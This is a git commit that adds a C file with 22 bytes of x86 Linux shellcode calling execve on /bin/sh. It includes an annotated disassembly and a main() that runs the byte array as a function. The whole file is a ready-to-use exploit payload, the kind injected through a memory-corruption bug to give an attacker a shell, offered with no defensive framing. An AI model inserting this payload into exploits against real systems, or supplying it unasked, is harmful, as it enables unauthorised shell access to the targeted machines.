cd988a41aceab2c6932184ff36f37818198a7d4a
SoulSaber1 <soulsaber1@gmail.com>
2017-01-17 17:59:57 -0500

    bin/sh

---
+++ x86-linux/linux_x86_binsh_execve.c
@@ -0,0 +1,22 @@
+#include <stdio.h>
+
+/*
+0:  31 c9                   xor    ecx,ecx
+2:  89 ca                   mov    edx,ecx
+4:  51                      push   ecx
+5:  68 2f 2f 73 68          push   0x68732f2f
+a:  68 2f 62 69 6e          push   0x6e69622f
+f:  89 e3                   mov    ebx,esp
+11: 6a 0b                   push   0xb
+13: 58                      pop    eax
+14: cd 80                   int    0x80
+*/
+
+char execve_sh[] = \
+"\x31\xC9\x89\xCA\x51\x68\x2F\x2F\x73\x68\x68"
+"\x2F\x62\x69\x6E\x89\xE3\x6A\x0B\x58\xCD\x80";
+
+int main(int argc, char **argv){
+  int (*test)() = (int(*)())execve_sh;
+  test();
+}
